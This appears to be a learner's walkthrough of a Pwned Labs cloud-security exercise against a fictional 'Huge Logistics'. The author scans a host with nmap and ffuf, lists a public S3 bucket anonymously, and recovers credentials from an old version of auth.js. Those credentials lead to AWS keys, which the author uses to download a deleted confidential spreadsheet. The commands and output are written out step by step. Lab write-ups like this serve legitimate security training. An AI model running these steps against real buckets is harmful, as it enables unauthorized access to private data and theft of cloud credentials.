https://app.pwnedlabs.io/labs/access-secrets-with-s3-bucket-versioning

### Scenario

Your team, renowned for its expertise in cloud security, has been enlisted by Huge Logistics to scrutinize their perimeter. Your main task? Investigate a specified IP range, noting that the address 16.171.123.169 is frequently mentioned in their public documentation. Unearth any potential security issues and provide a roadmap to bolster their defenses.

### Information provided

```
IP Address - 16.171.123.169
```

### Enumeration

We will start with `nmap` for service enumeration of the provided public IP address.

```
nmap 16.171.123.169
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-15 11:45 IST
Nmap scan report for ec2-16-171-123-169.eu-north-1.compute.amazonaws.com (16.171.123.169)
Host is up (0.31s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.08 seconds
```

We can see that port `TCP-80` is open with `http` service, implying that a web server is running.

![](Pasted%20image%2020260815152543.png)

The website contains a login page where we can supply credentials. We currently do not have information of the valid credentials.

Next, we take a look at the source of the web page.

![](Pasted%20image%2020260815152701.png)

One interesting thing to note is the presence of the `S3` bucket 

```
https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/
```

#### Directory enumeration

We will use `ffuf` for this task:-

```
ffuf -w /home/ayush-parab/ayush/HackTheBox/CPTS/SecLists/Discovery/Web-Content/common.txt -u http://16.171.123.169/FUZZ
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://16.171.123.169/FUZZ
 :: Wordlist         : FUZZ: /home/ayush-parab/ayush/HackTheBox/CPTS/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dashboard               [Status: 200, Size: 24462, Words: 10437, Lines: 589, Duration: 311ms]
profile                 [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 310ms]
:: Progress: [4751/4751] :: Job [1/1] :: 77 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

We can see two directories `dashboard` and `profile`.

`/dashboard` opens the dashboard page containing various data:-

![](Pasted%20image%2020260815152945.png)

However, we are not able to open the `/profile` page yet. Maybe because we have not logged in.

![](Pasted%20image%2020260815153030.png)

We get redirected to `/login`

#### S3 bucket enumeration

```
https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/
```

Opening the public endpoint of the S3 bucket shows us the following information about the content stored inside the bucket.

![](Pasted%20image%2020260815153155.png)

Lets try to explore the bucket using `aws cli`

```
aws s3 ls s3://huge-logistics-dashboard --no-sign-request
                           PRE private/
                           PRE static/
```

There appear to be two directories out of which `private/` looks very interesting.

```
aws s3 ls s3://huge-logistics-dashboard/private/ --no-sign-request
2023-08-16 23:55:59          0 
```

`private/` directory seems to be empty!

```
aws s3 ls s3://huge-logistics-dashboard/static/ --no-sign-request
                           PRE css/
                           PRE images/
                           PRE js/
```

```
aws s3 ls s3://huge-logistics-dashboard/static/js/ --no-sign-request
                           PRE plugins/
2023-08-13 00:39:21        590 api.js
2023-08-13 02:13:43        244 auth.js
2023-08-13 00:39:22       7297 dash.js
2023-08-13 00:39:24      19027 demo.js
2023-08-13 00:39:28      84355 jquery.min.js
2023-08-13 00:39:32     127542 jquery.min.map
2023-08-13 00:39:34      18994 popper.min.js
```

```
aws s3 ls s3://huge-logistics-dashboard/static/js/plugins/ --no-sign-request
2023-08-13 00:39:36      15612 bootstrap-notify.js
2023-08-13 00:39:42     157844 chartjs.min.js
2023-08-13 00:39:44      18292 perfect-scrollbar.jquery.min.js
```

Out of all the above files, I checked the `auth.js` file in hopes of getting more information about the credentials used for logging in but there was nothing interesting. Similarly with the other files.

Lets try getting more information about versioning inside the bucket.

```
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --no-sign-request
```

We get an 'Access Denied' error for bucket versioning.

Lets try listing the versions of the objects present inside.

```
aws s3api list-object-versions --bucket huge-logistics-dashboard --no-sign-request
```

```
{
    "Versions": [
        {
            "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "private/",
            "VersionId": "LFkKXfYHprr7YC4BgFt5BbQPLLZWfu0B",
            "IsLatest": true,
            "LastModified": "2023-08-16T18:25:59+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"24f3e7a035c28ef1f75d63a93b980770\"",
            "Size": 24119,
            "StorageClass": "STANDARD",
            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
            "VersionId": "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8",
            "IsLatest": false,
            "LastModified": "2023-08-16T19:11:03+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"ba1c4a5dbbc96e58d1c4c261229f5cfc\"",
            "Size": 833071,
            "StorageClass": "STANDARD",
            "Key": "static/css/dashboard-free.css.map",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:01+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"d3fc7dc75190b041bf304da16b530679\"",
            "Size": 402732,
            "StorageClass": "STANDARD",
            "Key": "static/css/dashboard.css",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:14+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"48cf264bc912e182e28baade4a8ce265\"",
            "Size": 904,
            "StorageClass": "STANDARD",
            "Key": "static/css/demo.css",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:17+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"394dc8c2af0a0ee7d7174619b543e2bd\"",
            "Size": 7743,
            "StorageClass": "STANDARD",
            "Key": "static/css/icons.css",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:19+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"3cf0216308927cb12749a6f64aaeeb66\"",
            "Size": 495,
            "StorageClass": "STANDARD",
            "Key": "static/css/main.css",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:19+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"23287c64c9cb99cf3ec35be449b7f5f1\"",
            "Size": 15996,
            "StorageClass": "STANDARD",
            "Key": "static/images/favicon.ico",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:08:05+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"1c3f3d5ee3b19b3434f12267aa29f1bb\"",
            "Size": 251708,
            "StorageClass": "STANDARD",
            "Key": "static/images/hero.jpg",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:08:17+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"23287c64c9cb99cf3ec35be449b7f5f1\"",
            "Size": 15996,
            "StorageClass": "STANDARD",
            "Key": "static/images/logo.png",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:08:20+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"bd6820f1a4015e9645e470ea8e7b1501\"",
            "Size": 37930,
            "StorageClass": "STANDARD",
            "Key": "static/images/profile.png",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:08:24+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"f3bea160dc67332a793ad480cd1d81ff\"",
            "Size": 590,
            "StorageClass": "STANDARD",
            "Key": "static/js/api.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:21+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"c3d04472943ae3d20730c1b81a3194d2\"",
            "Size": 244,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "j2hElDSlveHRMaivuWldk8KSrC.vIONW",
            "IsLatest": true,
            "LastModified": "2023-08-12T20:43:43+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
            "Size": 463,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
            "IsLatest": false,
            "LastModified": "2023-08-12T19:13:25+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"c5532b875a1c7a535b915e4269c4f7a4\"",
            "Size": 7297,
            "StorageClass": "STANDARD",
            "Key": "static/js/dash.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:22+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"0a8e7d7534303f07c0c56f72fb885443\"",
            "Size": 19027,
            "StorageClass": "STANDARD",
            "Key": "static/js/demo.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:24+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"7f9fb969ce353c5d77707836391eb28d\"",
            "Size": 84355,
            "StorageClass": "STANDARD",
            "Key": "static/js/jquery.min.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:28+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"f36bd42238f343a13e5fb2e43f1242f4\"",
            "Size": 127542,
            "StorageClass": "STANDARD",
            "Key": "static/js/jquery.min.map",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:32+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"21e771df8c43c1161520b9e64ed04ebe\"",
            "Size": 15612,
            "StorageClass": "STANDARD",
            "Key": "static/js/plugins/bootstrap-notify.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:36+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"22e340e498652dcc2b2926ba77ffb552\"",
            "Size": 157844,
            "StorageClass": "STANDARD",
            "Key": "static/js/plugins/chartjs.min.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:42+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"04ed9673cfe318346efe72b5f8dcc5a8\"",
            "Size": 18292,
            "StorageClass": "STANDARD",
            "Key": "static/js/plugins/perfect-scrollbar.jquery.min.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:44+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"3621381129597bf34d48a9e2623e05c9\"",
            "Size": 18994,
            "StorageClass": "STANDARD",
            "Key": "static/js/popper.min.js",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2023-08-12T19:09:34+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        }
    ],
    "DeleteMarkers": [
        {
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            },
            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
            "VersionId": "whIGcxw1PmPE1Ch2uUwSWo3D5WbNrPIR",
            "IsLatest": true,
            "LastModified": "2023-08-16T19:12:39+00:00"
        }
    ],
    "RequestCharged": null,
    "Prefix": ""
}
```

Just as we guessed, there is an excel sheet which seems to have been deleted!

`"Key": "private/Business Health - Board Meeting (Confidential).xlsx"`

Whenever a file inside a S3 bucket which has versioning ON is deleted, it is not simple removed from the bucket but a `DeleteMarker` gets applied onto it which makes it invisible from us. 

Now, we know that we need to exfiltrate the particular excel file which seems to be deleted. We have two options:-
- Delete the `DeleteMarker` using its version which will make the previous version as active
- Extract the data from the previous version directly

##### Option 1

```
aws s3api delete-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidental).xlsx" --version-id whIGcxw1PmPE1Ch2uUwSWo3D5WbNrPIR --no-sign-request
```

```
aws: [ERROR]: An error occurred (AccessDenied) when calling the DeleteObject operation: Access Denied
```

We get an access denied error.

##### Option 2

```
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8" --profile Ayush --no-sign-request exfil_data.xlsx
```

```
aws: [ERROR]: An error occurred (AccessDenied) when calling the GetObject operation: Access Denied
```

Same error!

We have exhausted both of the options. Lets look at the output for versions of objects carefully. We can see one more object which has more than one versions and it is `auth.js`

Lets try extracting the content of the previous version of `auth.js`

```
aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh" --profile Ayush --no-sign-request old_auth.js
```

```
{
    "AcceptRanges": "bytes",
    "LastModified": "2023-08-12T19:13:25+00:00",
    "ContentLength": 463,
    "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
    "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
    "ContentType": "application/javascript",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
```

We have credentials in plain sight!

![](Pasted%20image%2020260815154355.png)

Let us use these credentials to login on the website!

### Initial access

After entering the credentials on the login page, we navigate to the `/profile` directory on the website and find a set of AWS keys!

![](Pasted%20image%2020260815154648.png)

Let us try using these access keys in our CLI.

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDATWVWNKAVEJCVKW2CS",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/data-user"
}
```

We have successfully logged in as an IAM user.

### Data exfiltration

Now lets try extracting the previous version of the confidential file we found inside the S3 bucket's `private/` directory.

```
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8" ./exfil_data.xlsx
```

```
{
    "AcceptRanges": "bytes",
    "LastModified": "2023-08-16T19:11:03+00:00",
    "ContentLength": 24119,
    "ETag": "\"24f3e7a035c28ef1f75d63a93b980770\"",
    "VersionId": "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8",
    "ContentType": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
```

We were able to download the file!

Initially I though the file is password encrypted, but it is NOT! Just open the file to get the flag!

